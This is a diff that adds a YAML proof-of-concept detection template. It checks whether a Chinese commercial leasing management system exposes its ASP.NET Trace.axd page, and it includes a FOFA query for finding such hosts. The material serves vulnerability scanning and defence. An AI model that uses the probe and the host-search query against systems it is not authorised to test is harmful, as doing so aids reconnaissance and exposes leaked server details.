@@ -1,0 +1,15 @@
+id: poc-yaml-ifca-clms-trace-info-leak
+info:
+  name: 竞优商业租赁管理系统 Trace 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 竞优商业租赁管理系统
+  fofa: body="商业租赁管理系统"
+requests:
+- method: GET
+  path: /RMS/Trace.axd
+  expression: status_code == 200 && contains(body,"应用程序跟踪") && contains(body,"物理目录")
+    && contains(body,"查看详细信息") && contains(body,"文件")
+variables: {}
+transport: http
